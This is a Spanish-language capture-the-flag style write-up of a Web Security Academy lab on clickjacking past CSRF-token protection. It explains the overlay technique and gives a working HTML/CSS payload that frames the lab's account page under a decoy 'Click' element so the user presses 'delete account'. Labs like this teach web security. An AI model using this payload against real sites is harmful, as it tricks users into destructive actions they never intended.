Este laboratorio muestra cómo realizar un ataque de clickjacking incluso cuando la acción sensible está protegida por un token CSRF. Se aprovecha la falta de encabezados de protección como X-Frame-Options para incrustar la página vulnerable dentro de un iframe en un sitio externo.

La estrategia consiste en superponer un elemento visual atractivo como un botón que diga Click me justo encima del botón de eliminar cuenta. Para ello se ajustan las propiedades de posición, tamaño y opacidad del iframe de forma que el usuario, al intentar hacer clic en el contenido visible del sitio señuelo, en realidad pulse sobre la acción destructiva del sitio objetivo.

Este tipo de ataque es posible cuando no existen medidas que impidan la carga del sitio objetivo en iframes de terceros, y es aún más efectivo cuando el usuario realiza la acción de manera involuntaria al seguir una instrucción aparentemente inofensiva como haz clic aquí.

Este laboratorio permite comprender cómo técnicas visuales engañosas pueden ser tan efectivas como vulnerabilidades técnicas si la interfaz no está debidamente protegida.

Solucion
Basicamente en este laboratorio es engañar al usuario para que le de en un boton donde el texto esta disfrazado 
Aqui el payload
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 600px;
        opacity: 0.1;
    }
    div {
        position:absolute;
        top: 500px;
        left: 40px;
    }
</style>
<div>Click</div>
<iframe src="https://0a8800b9034fe4b880dd9e3e0002001c.web-security-academy.net/my-account"></iframe>

![[Pasted image 20250724215309.png]]
